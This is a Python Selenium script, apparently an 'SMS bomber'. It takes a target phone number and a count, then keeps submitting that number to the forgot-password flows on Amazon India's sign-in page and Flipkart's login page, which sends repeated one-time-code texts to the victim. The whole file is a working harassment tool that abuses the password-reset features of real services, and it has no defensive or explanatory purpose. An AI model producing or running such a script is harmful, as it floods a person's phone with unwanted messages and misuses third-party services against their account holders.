from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time

n = int(input("Enter the number of sms you want to send (Even) : "))
number = input("Enter the Number to send sms: ")
PATH ="C:\Program Files (x86)\chromedriver.exe"
url1 ="https://www.amazon.in/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.in%2F%3Fref_%3Dnav_ya_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=inflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&"
url2 = "https://www.flipkart.com/account/login"
for i in range(n):   #number of times we want to sms bomb
    if i%2==0:
        driver = webdriver.Chrome(PATH)
        driver.get("https://www.amazon.in/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.in%2F%3Fref_%3Dnav_ya_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=inflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&")
        number_input = driver.find_element_by_xpath("""//*[@id="ap_email"]""")
        number_input.send_keys(number)
        number_input.submit()

        forgot = driver.find_element_by_xpath("""//*[@id="auth-fpp-link-bottom"]""")
        forgot.click()

        continue_ = driver.find_element_by_xpath("""//*[@id="continue"]""")
        continue_.click()

        time.sleep(10)

        driver.quit()

    else:

        driver = webdriver.Chrome(PATH)
        driver.get(url2)

        number_input = driver.find_element_by_xpath("""//*[@id="container"]/div/div[3]/div/div[2]/div/form/div[1]/input""")
        number_input.send_keys(number)

        forgot = driver.find_element_by_xpath("""//*[@id="container"]/div/div[3]/div/div[2]/div/form/div[2]/a/span""")
        forgot.click()

        time.sleep(10)

        driver.quit()

        
